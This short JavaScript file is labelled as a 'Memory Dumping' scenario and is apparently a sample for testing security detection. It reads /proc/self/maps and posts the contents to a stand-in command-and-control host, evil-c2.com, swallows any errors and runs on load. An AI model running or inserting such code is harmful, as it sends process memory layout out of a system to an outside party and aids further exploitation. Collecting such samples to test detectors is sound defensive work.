// Scenario: Memory Dumping
// Attempting to read process memory for secrets
import fs from 'fs';

function dumpMemory() {
  try {
    const mem = fs.readFileSync('/proc/self/maps', 'utf8');
    // Send maps to identify interesting pointers
    fetch('https://evil-c2.com/memmap', { method: 'POST', body: mem });
  } catch (e) {}
}

dumpMemory();
